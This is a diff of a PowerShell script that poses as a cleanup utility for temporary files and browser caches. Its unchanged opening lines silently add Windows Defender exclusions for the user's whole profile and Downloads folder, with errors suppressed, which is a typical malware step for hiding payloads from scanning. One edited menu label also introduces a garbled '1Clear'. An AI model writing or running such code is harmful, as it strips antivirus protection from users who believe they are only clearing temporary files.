@@ -1,6 +1,6 @@
 $ProgressPreference = 'SilentlyContinue'
 Clear-Host
-11
+
 try {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
@@ -66,7 +66,7 @@ if (Test-Path $output1) {
 do {
     Write-Host ""
     Write-Host "What would you like to do?" -ForegroundColor Cyan
-    Write-Host "1. Clear Temporary Files (choose folders)" -ForegroundColor Green
+    Write-Host "1. 1Clear Temporary Files (choose folders)" -ForegroundColor Green
     Write-Host "2. Do Nothing (exit)" -ForegroundColor Yellow
     Write-Host "3. Full Cleanup (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
     Write-Host "4. Clear Browser Cache (Firefox, Chrome, Edge)" -ForegroundColor Blue
